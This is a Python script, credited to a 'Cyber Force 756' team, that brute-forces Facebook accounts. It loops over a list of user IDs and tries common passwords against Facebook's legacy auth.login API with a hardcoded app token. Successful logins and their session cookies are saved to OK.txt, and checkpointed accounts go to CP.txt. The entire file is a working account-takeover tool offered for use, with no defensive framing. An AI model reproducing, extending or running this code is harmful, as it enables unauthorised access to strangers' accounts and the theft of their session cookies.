import requests, json, time, random, urllib.parse
from io import BytesIO
import pycurl
import os

# BANNER
banner = """
\033[1;91m██╗\033[1;92m██████╗ \033[1;93m███████╗ \033[1;94m█████╗ \033[1;95m███╗   ██╗     \033[1;96m█████╗ ██╗  ██╗███╗   ███╗███████╗██████╗\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔════╝\033[1;94m██╔══██╗\033[1;95m████╗  ██║    \033[1;96m██╔══██╗██║  ██║████╗ ████║██╔════╝██╔══██╗\033[0m
\033[1;91m██║\033[1;92m██████╔╝\033[1;93m█████╗  \033[1;94m███████║\033[1;95m██╔██╗ ██║    \033[1;96m███████║███████║██╔████╔██║█████╗  ██║  ██║\033[0m
\033[1;91m██║\033[1;92m██╔══██╗\033[1;93m██╔══╝  \033[1;94m██╔══██║\033[1;95m██║╚██╗██║    \033[1;96m██╔══██║██╔══██║██║╚██╔╝██║██╔══╝  ██║  ██║\033[0m
\033[1;91m██║\033[1;92m██║  ██║\033[1;93m██║     \033[1;94m██║  ██║\033[1;95m██║ ╚████║    \033[1;96m██║  ██║██║  ██║██║ ╚═╝ ██║███████╗██████╔╝\033[0m
\033[1;91m╚═╝\033[1;92m╚═╝  ╚═╝\033[1;93m╚═╝     \033[1;94m╚═╝  ╚═╝\033[1;95m╚═╝  ╚═══╝    \033[1;96m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝\033[0m
"""

def show_creator_box():
    print('\033[1;95m╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═══╗')
    print('║         👑 TOOL INFORMATION 👑         ║')
    print('╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═══╣')
    print('║ Creator : Irfan Ahmed                  ║')
    print('║ Team    : Cyber Force 756              ║')
    print('║ Tools   : UID Brute Force + Cookie 🧠   ║')
    print('╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═══╝\033[0m')

# Fixed password list
passwords = [
    '123456', '123123', '111222', '12345678', '123456789',
    '111111', '112233', '555555', '222222', '333333', 'password'
]

def try_login(uid, password):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'b-api.facebook.com'
    }

    payload = {
        'email': uid,
        'password': password,
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'json',
        'sdk_version': '2',
        'generate_session_cookies': '1',
        'locale': 'en_US',
        'method': 'auth.login'
    }

    encoded_data = urllib.parse.urlencode(payload)
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, 'https://b-api.facebook.com/method/auth.login')
    c.setopt(c.POST, 1)
    c.setopt(c.POSTFIELDS, encoded_data)
    c.setopt(c.WRITEDATA, buffer)
    c.setopt(c.TIMEOUT, 10)
    c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])

    try:
        c.perform()
        response = buffer.getvalue().decode()
        data = json.loads(response)

        # ✅ Login Success
        if "session_key" in data:
            cookies = data.get("session_cookies", [])
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
            print(f"\033[1;92m[OK] {uid} | {password}")
            print(f"     🍪 Cookie: {cookie_str}\033[0m")
            with open("OK.txt", "a") as f:
                f.write(f"{uid}|{password}|{cookie_str}\n")
            return "OK"

        # ✅ CP Only If Password Matched But Checkpointed
        elif "error_msg" in data and "checkpoint" in data["error_msg"].lower():
            if "invalid" not in data["error_msg"].lower():
                print(f"\033[1;93m[CP] {uid} | {password}\033[0m")
                with open("CP.txt", "a") as f:
                    f.write(f"{uid}|{password}\n")
                return "CP"

    except Exception as e:
        print(f"\033[1;91m[Error] {uid} | {password} -> {e}\033[0m")
    finally:
        c.close()
        buffer.close()

    return None

def main():
    os.system("clear")
    print(banner)
    show_creator_box()

    file = input("\n📂 UID ফাইল দিন (ex: uids.txt): ")
    if not os.path.exists(file):
        print("❌ ফাইল পাওয়া যায়নি!")
        return

    with open(file) as f:
        uids = [x.strip() for x in f if x.strip()]
    print(f"\n🔍 Total UID Loaded: {len(uids)}\n")

    for uid in uids:
        for pwd in passwords:
            result = try_login(uid, pwd)
            if result in ["OK", "CP"]:
                break

if __name__ == "__main__":
    main()
